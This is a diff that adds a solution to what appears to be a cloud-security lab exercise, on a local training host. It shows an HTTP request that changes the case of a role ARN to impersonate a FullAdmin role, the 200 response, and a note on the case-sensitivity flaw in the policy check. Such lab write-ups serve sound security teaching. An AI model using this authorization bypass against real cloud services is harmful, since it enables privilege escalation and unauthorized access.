@@ -139,12 +139,32 @@ The goal is to get a success response like the following:
 
 ##### Solution
 
+Changing the case of the input value:
+
 ```http
-TODO add example
+POST /uat/petSitter HTTP/1.1
+Host: cazt.gcloud.localtest.me:8443
+user-agent: google-cloud-sdk gcloud/538.0.0 command/gcloud.cazt.pet-sitter invocation-id/9b7b5138daed4bf0a60c164e9d7cf11b environment/None environment-version/None client-os/LINUX client-os-ver/6.6.87 client-pltf-arch/x86_64 interactive/True from-script/False python/3.12.10 term/xterm-256color (Linux 6.6.87.2-microsoft-standard-WSL2)
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer Y2F6dF9zY2VuN19pbXBlcnNvbmF0aW9uQDAwMDAwMDAwMTExMQ==
+Content-Length: 58
+Content-Type: application/json
+
+{"Arn": "arn:cloud:iam:us-Texas-9:000000001111:FullAdmin"}
 ```
 
 ```http
-TODO add example
+HTTP/1.1 200 OK
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Sat, 13 Sep 2025 17:20:20 GMT
+Content-Type: application/json
+Content-Length: 102
+
+{
+     "Message": "000000001111 using impersonation arn:cloud:iam:us-texas-9:000000001111:FullAdmin"
+}
 ```
 
 In this case the software bug in the API was that the policy authorization rules were applied with case sensitivity in parts that were case insensitive.
